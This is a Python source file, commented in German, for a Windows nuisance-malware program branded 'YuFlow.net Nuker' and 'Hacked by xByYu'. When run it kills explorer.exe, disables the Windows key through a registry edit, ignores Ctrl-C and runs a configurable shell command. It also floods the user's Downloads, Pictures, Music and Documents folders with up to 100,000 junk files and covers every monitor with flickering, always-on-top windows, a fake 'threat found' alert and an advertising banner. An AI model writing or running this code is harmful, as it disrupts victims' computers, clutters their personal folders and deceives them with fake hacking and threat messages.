import subprocess
import sys
import os
import ensurepip
import random
import time
import threading
import signal
import tkinter as tk
import win32gui
import win32con
from PIL import Image, ImageTk
import requests
import winreg
import shutil
import string

# Funktion zum Installieren von Paketen
def install_package(package):
    attempts = 3
    for attempt in range(attempts):
        try:
            __import__(package)
            print(f"{package} ist bereits installiert.")
            return
        except ImportError:
            print(f"Versuche, {package} zu installieren (Versuch {attempt + 1}/{attempts})...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"{package} erfolgreich installiert.")
                return
            except subprocess.CalledProcessError:
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--user"])
                    print(f"{package} erfolgreich mit --user installiert.")
                    return
                except subprocess.CalledProcessError as e:
                    print(f"Fehler bei der Installation von {package}: {e}")
        time.sleep(1)
    print(f"Konnte {package} nicht installieren. Bitte manuell installieren: {sys.executable} -m pip install {package}")
    exit(1)

def ensure_pip_and_packages():
    try:
        import pip
        print("pip ist bereits installiert.")
    except ImportError:
        print("pip wird installiert...")
        try:
            ensurepip.bootstrap()
            os.environ.pop("PIP_REQ_TRACKER", None)
            print("pip erfolgreich installiert.")
        except Exception as e:
            print(f"Fehler bei der pip-Installation: {e}")
            exit(1)

    packages = ["screeninfo", "pywin32", "Pillow", "requests"]
    for pkg in packages:
        install_package(pkg)

ensure_pip_and_packages()

try:
    from screeninfo import get_monitors
except ImportError:
    print("screeninfo konnte nicht geladen werden. Bitte manuell installieren: pip install screeninfo")
    exit(1)

try:
    import win32gui
    import win32con
except ImportError:
    print("pywin32 konnte nicht geladen werden. Bitte manuell installieren: pip install pywin32")
    exit(1)

try:
    from PIL import Image, ImageTk
except ImportError:
    print("Pillow konnte nicht geladen werden. Bitte manuell installieren: pip install Pillow")
    exit(1)

# Gruselige Farben
colors = ["red", "black", "white", "darkred", "gray10", "crimson", "darkviolet", "lime"]

# Globale Variable
stop_program = False

# Benutzerdefinierter Befehl (hier anpassen!)
USER_COMMAND = "notepad"  # Beispiel: Ändere zu z. B. "calc", "ping google.com", "echo Test > test.txt"

# Funktion zum Herunterladen und Speichern des GIFs mit Duplikation
def download_and_save_gif(url):
    try:
        username = os.getlogin()
        local_path = os.path.join("C:\\Users", username, "Creapyvid.gif")
        
        if not os.path.exists(local_path):
            response = requests.get(url, timeout=5)
            response.raise_for_status()
            with open(local_path, "wb") as f:
                f.write(response.content)
            print(f"GIF gespeichert unter: {local_path}")
        else:
            print(f"GIF existiert bereits lokal: {local_path}")

        for i in range(1, 51):
            dupe_path = os.path.join("C:\\Users", username, f"pyimage{i}.gif")
            if not os.path.exists(dupe_path):
                shutil.copyfile(local_path, dupe_path)
                print(f"Duplikat erstellt: {dupe_path}")
            else:
                print(f"Duplikat existiert bereits: {dupe_path}")

        return local_path
    except Exception as e:
        print(f"Fehler beim Herunterladen/Speichern/Duplizieren des GIFs von {url}: {e}")
        return None

# Funktion zum Beenden von explorer.exe
def kill_explorer():
    try:
        os.system("taskkill /F /IM explorer.exe")
        print("explorer.exe wurde beendet.")
    except Exception as e:
        print(f"Fehler beim Beenden von explorer.exe: {e}")

# Funktion zum Erstellen von YuFlow.net Nuker Dateien in spezifischen Ordnern
def create_chaos_files():
    try:
        username = os.getlogin()
        target_folders = [
            os.path.join("C:\\Users", username, "Downloads"),
            os.path.join("C:\\Users", username, "Pictures"),
            os.path.join("C:\\Users", username, "Music"),
            os.path.join("C:\\Users", username, "Documents")
        ]
        total_files = 0
        max_files = 100000  # Obergrenze, um System nicht zu killen
        
        for folder in target_folders:
            if not os.path.exists(folder):
                print(f"Ordner nicht gefunden, überspringe: {folder}")
                continue
                
            for root, dirs, _ in os.walk(folder, topdown=True):
                try:
                    if total_files >= max_files:
                        print(f"Obergrenze von {max_files} Dateien erreicht, breche ab.")
                        break
                    
                    for i in range(1, 201):  # 200 Dateien pro Verzeichnis
                        file_path = os.path.join(root, f"YuFlow.net Nuker {i}.txt")
                        if not os.path.exists(file_path):
                            with open(file_path, "w") as f:
                                f.write("CHAOS!")
                            print(f"YuFlow.net Nuker Datei erstellt: {file_path}")
                            total_files += 1
                            if total_files >= max_files:
                                print(f"Obergrenze von {max_files} Dateien erreicht, breche ab.")
                                break
                        else:
                            print(f"YuFlow.net Nuker Datei existiert bereits: {file_path}")
                except (PermissionError, OSError) as e:
                    print(f"Zugriff verweigert oder Fehler in {root}: {e}, überspringe.")
                    continue
                
        print(f"Insgesamt {total_files} YuFlow.net Nuker Dateien erstellt.")
    except Exception as e:
        print(f"Fehler beim Erstellen von YuFlow.net Nuker Dateien: {e}")

# Funktion zum Erstellen einer Zufallsbyte-Datei
def create_random_bytes_file():
    try:
        username = os.getlogin()
        file_path = os.path.join("C:\\Users", username, "bootloader_chaos.bin")
        size_mb = 10
        with open(file_path, "wb") as f:
            f.write(os.urandom(1024 * 1024 * size_mb))
        print(f"Zufallsbyte-Datei erstellt: {file_path} ({size_mb} MB)")
    except Exception as e:
        print(f"Fehler beim Erstellen der Zufallsbyte-Datei: {e}")

# Funktion zum Deaktivieren der Windows-Taste
def disable_windows_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", 0, winreg.KEY_ALL_ACCESS)
        scancode_map = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0xE0, 0x00, 0x00, 0x5C, 0xE0, 0x00, 0x00, 0x00, 0x00])
        winreg.SetValueEx(key, "Scancode Map", 0, winreg.REG_BINARY, scancode_map)
        winreg.CloseKey(key)
        print("Windows-Taste deaktiviert.")
    except Exception as e:
        print(f"Fehler beim Deaktivieren der Windows-Taste (Adminrechte erforderlich?): {e}")

# Funktion zum Reaktivieren der Windows-Taste
def enable_windows_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "Scancode Map")
        winreg.CloseKey(key)
        print("Windows-Taste reaktiviert.")
    except Exception as e:
        print(f"Fehler beim Reaktivieren der Windows-Taste: {e}")

def ignore_interrupt():
    signal.signal(signal.SIGINT, lambda x, y: print("Kein Entkommen, Bro! 😈"))

def set_always_on_top(window):
    hwnd = window.winfo_id()
    win32gui.SetWindowPos(
        hwnd,
        win32con.HWND_TOPMOST,
        0, 0, 0, 0,
        win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
    )

def create_taskbar_overlay():
    try:
        root = tk.Tk()
        root.overrideredirect(True)
        root.attributes("-alpha", 1.0)
        root.configure(bg="white")
        screen_width = root.winfo_screenwidth()
        taskbar_height = 40
        root.geometry(f"{screen_width}x{taskbar_height}+0+{root.winfo_screenheight() - taskbar_height}")
        set_always_on_top(root)
        root.mainloop()
    except Exception as e:
        print(f"Fehler beim Erstellen der Taskleisten-Überlagerung: {e}")

def create_gif_window(monitor, window_id):
    global stop_program
    try:
        GIF_URL = "http://yuflow.net/images/Creapyvid.gif"
        local_gif_path = download_and_save_gif(GIF_URL)
        if not local_gif_path:
            print(f"Konnte GIF nicht laden: {GIF_URL}. Chaos geht weiter!")
            return

        root = tk.Tk()
        width = random.randint(200, 700)
        height = random.randint(150, 500)
        root.geometry(f"{width}x{height}+{monitor.x}+{monitor.y}")
        root.attributes("-alpha", random.uniform(0.5, 1.0))
        root.overrideredirect(True)
        set_always_on_top(root)

        canvas = tk.Canvas(
            root,
            width=width,
            height=height,
            bg="black",
            highlightthickness=8,
            highlightbackground=random.choice(colors)
        )
        canvas.pack()

        gif = Image.open(local_gif_path)
        frames = []
        try:
            while True:
                resized_gif = gif.copy().resize((width-16, height-16), Image.Resampling.LANCZOS)
                frame = ImageTk.PhotoImage(resized_gif)
                frames.append(frame)
                gif.seek(len(frames))
        except EOFError:
            pass

        root.frames = frames
        image_id = canvas.create_image(width//2, height//2, image=frames[0], tags=f"gif_{window_id}")

        def animate_gif(frame_idx=0):
            if not stop_program:
                try:
                    canvas.itemconfig(f"gif_{window_id}", image=frames[frame_idx])
                    canvas.configure(highlightbackground=random.choice(colors))
                    set_always_on_top(root)
                    root.after(30, animate_gif, (frame_idx + 1) % len(frames))
                except Exception as e:
                    print(f"GIF-Fenster {window_id} Animationsfehler ignoriert: {e}")

        animate_gif()

        def move_gif():
            dx = random.randint(-120, 120)
            dy = random.randint(-120, 120)
            while not stop_program:
                x = root.winfo_x() + dx
                y = root.winfo_y() + dy
                if x < monitor.x or x > monitor.x + monitor.width - width:
                    dx = -dx * random.randint(1, 6)
                if y < monitor.y or y > monitor.y + monitor.height - height:
                    dy = -dy * random.randint(1, 6)
                root.geometry(f"{width}x{height}+{x}+{y}")
                set_always_on_top(root)
                time.sleep(random.uniform(0.001, 0.005))

        threading.Thread(target=move_gif, daemon=True).start()
        root.mainloop()
    except Exception as e:
        print(f"GIF-Fenster {window_id} Fehler ignoriert: {e}")

def create_flicker_chaos(monitor):
    global stop_program
    overlay = tk.Tk()
    overlay.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
    overlay.attributes("-fullscreen", False)
    overlay.attributes("-alpha", 0.85)
    overlay.configure(bg="black")
    overlay.overrideredirect(True)
    set_always_on_top(overlay)

    canvas = tk.Canvas(
        overlay,
        width=monitor.width,
        height=monitor.height,
        highlightthickness=15,
        highlightbackground=random.choice(colors)
    )
    canvas.pack()

    banner_window = tk.Toplevel(overlay)
    banner_window.overrideredirect(True)
    banner_window.attributes("-alpha", 1.0)
    set_always_on_top(banner_window)
    banner_label = tk.Label(
        banner_window,
        text="YuFlow.net - Join now",
        font=("Arial", 90, "bold"),
        bg="white",
        fg="black"
    )
    banner_label.pack()

    hack_labels = []
    fonts = ["Courier New", "Fixedsys", "OCR-A", "Consolas", "Terminal", "Impact"]
    for _ in range(50):
        hack_window = tk.Toplevel(overlay)
        hack_window.overrideredirect(True)
        hack_window.attributes("-alpha", random.uniform(0.2, 1.0))
        set_always_on_top(hack_window)
        label = tk.Label(
            hack_window,
            text="Hacked by xByYu",
            font=(random.choice(fonts), random.randint(20, 200), "bold"),
            bg="black",
            fg=random.choice(["red", "white", "crimson", "darkviolet", "lime"])
        )
        label.pack()
        hack_labels.append((hack_window, label))

    def flicker():
        banner_visible = False
        hack_visible = [False] * len(hack_labels)
        while not stop_program:
            if random.random() < 0.999:
                canvas.configure(highlightbackground=random.choice(colors))
                overlay.configure(bg=random.choice(colors))
            else:
                canvas.configure(highlightbackground="black")
                overlay.configure(bg="black")

            if random.random() < 0.98:
                if not banner_visible:
                    banner_window.geometry(
                        f"1000x200+"
                        f"{monitor.x + random.randint(0, monitor.width - 1000)}+"
                        f"{monitor.y + random.randint(0, monitor.height - 200)}"
                    )
                    banner_visible = True
                    banner_label.configure(
                        bg="black" if random.random() < 0.5 else "white",
                        fg="white" if banner_label.cget("bg") == "black" else "black",
                        font=("Arial", random.randint(90, 110), "bold")
                    )
                set_always_on_top(banner_window)
            else:
                if banner_visible:
                    banner_window.geometry("1000x200+-1000+-1000")
                    banner_visible = False

            for i, (hack_window, label) in enumerate(hack_labels):
                if random.random() < 0.95:
                    if not hack_visible[i]:
                        hack_window.geometry(
                            f"800x180+"
                            f"{monitor.x + random.randint(0, monitor.width - 800)}+"
                            f"{monitor.y + random.randint(0, monitor.height - 180)}"
                        )
                        hack_visible[i] = True
                        glitch_text = "Hacked by xByYu" + "".join(random.choice("!@#$%^&*") for _ in range(random.randint(0, 8)))
                        label.configure(
                            fg=random.choice(["red", "white", "crimson", "darkviolet", "lime"]),
                            bg="black",
                            font=(random.choice(fonts), random.randint(20, 200), "bold"),
                            text=glitch_text
                        )
                    set_always_on_top(hack_window)
                else:
                    if hack_visible[i]:
                        hack_window.geometry("800x180+-1000+-1000")
                        hack_visible[i] = False

            overlay.geometry(
                f"{monitor.width}x{monitor.height}+"
                f"{monitor.x + random.randint(-350, 350)}+"
                f"{monitor.y + random.randint(-350, 350)}"
            )
            set_always_on_top(overlay)

            time.sleep(random.uniform(0.000005, 0.0001))

    threading.Thread(target=flicker, daemon=True).start()
    overlay.mainloop()

def create_messagebox():
    global stop_program
    root = tk.Tk()
    root.withdraw()

    monitors = get_monitors()
    monitor = random.choice(monitors)

    edge = random.choice(["top", "bottom", "left", "right"])
    if edge == "top":
        x = random.randint(monitor.x, monitor.x + monitor.width - 200)
        y = monitor.y
    elif edge == "bottom":
        x = random.randint(monitor.x, monitor.x + monitor.width - 200)
        y = monitor.y + monitor.height - 100
    elif edge == "left":
        x = monitor.x
        y = random.randint(monitor.y, monitor.y + monitor.height - 100)
    else:
        x = monitor.x + monitor.width - 200
        y = random.randint(monitor.y, monitor.y + monitor.height - 100)

    msg_window = tk.Toplevel(root)
    msg_window.geometry(f"200x100+{x}+{y}")
    msg_window.overrideredirect(True)
    msg_window.attributes("-alpha", 1.0)
    msg_window.configure(bg="black")
    set_always_on_top(msg_window)

    label = tk.Label(
        msg_window,
        text="Alarm, Bedrohung gefunden!",
        font=("Courier New", 12, "bold"),
        bg="black",
        fg="red"
    )
    label.pack(pady=10)

    def on_ok():
        global stop_program
        stop_program = True
        enable_windows_key()
        msg_window.destroy()
        root.destroy()

    button = tk.Button(
        msg_window,
        text="OK",
        command=on_ok,
        bg="red",
        fg="white",
        font=("Courier New", 10, "bold")
    )
    button.pack()

def spawn_chaos():
    global stop_program
    print("INSANE HACK-CHAOS! Finde OK, Bro! 😈")
    ignore_interrupt()
    try:
        disable_windows_key()
        threading.Thread(target=create_taskbar_overlay, daemon=True).start()
        threading.Thread(target=kill_explorer, daemon=True).start()
        threading.Thread(target=create_chaos_files, daemon=True).start()
        threading.Thread(target=create_random_bytes_file, daemon=True).start()

        print(f"Führe Befehl aus: {USER_COMMAND}")
        subprocess.run(USER_COMMAND, shell=True, check=False)

        monitors = get_monitors()
        for monitor in monitors:
            for i in range(15):
                threading.Thread(target=create_gif_window, args=(monitor, i), daemon=True).start()
            threading.Thread(target=create_flicker_chaos, args=(monitor,), daemon=True).start()
        time.sleep(0.5)
        threading.Thread(target=create_messagebox, daemon=True).start()
        while not stop_program:
            time.sleep(0.1)
    except Exception as e:
        print(f"Chaos regiert! Fehler ignoriert: {e}")
    finally:
        enable_windows_key()

if __name__ == "__main__":
    spawn_chaos()